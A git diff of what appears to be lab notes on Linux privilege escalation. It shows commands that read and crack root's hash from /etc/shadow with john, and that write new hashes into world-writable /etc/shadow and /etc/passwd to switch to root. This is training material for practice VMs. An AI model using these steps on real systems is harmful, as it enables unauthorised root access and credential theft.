@@ -87,7 +87,7 @@ View the contents of the /etc/shadow file.
 cat /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
 
@@ -99,12 +99,86 @@ Save the root user's hash to a file called hash.txt on your Kali VM and use john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (12).png" alt=""><figcaption></figcaption></figure>
 
 ## Weak File Permissions - Writable /etc/shadow
+
+Note that the /etc/shadow file on the VM is world-writable
 
 **Victim**
 
 ```
-s
+ls -l /etc/shadow
 ```
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Generate a new password hash with a password of your choice.
+
+**Victim**
+
+```
+mkpasswd -m sha-512 newpasswordhere
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Comment out the old one and add our output as the hash.
+
+**Victim**
+
+```
+vi /etc/shadow
+```
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+su root
+Password: newpasswordhere
+```
+
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+
+## Weak File Permissions - Writable /etc/passwd
+
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there. Note that the /etc/passwd file is world-writable.
+
+**Victim**
+
+```
+ls -l /etc/passwd
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Generate a new password hash with a password of your choice.
+
+**Victim**
+
+```
+openssl passwd newpasswordhere
+```
+
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x"). Switch to the root user, using the new password
+
+**Victim**
+
+```
+vi /etc/passwd
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+su root
+Password: newpasswordhere
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
